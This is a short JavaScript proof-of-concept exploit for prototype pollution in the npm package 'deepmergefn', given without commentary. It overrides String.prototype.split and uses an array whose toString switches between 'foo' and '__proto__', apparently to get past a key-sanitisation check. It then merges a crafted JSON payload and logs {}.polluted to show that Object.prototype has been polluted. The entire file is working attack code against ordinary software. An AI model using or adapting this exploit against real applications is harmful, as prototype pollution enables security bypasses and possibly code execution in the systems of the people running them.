var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const deepMerge = require('deepmergefn');
console.log({}.polluted);
EVIL_DATA = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
deepMerge({}, EVIL_DATA);
console.log({}.polluted);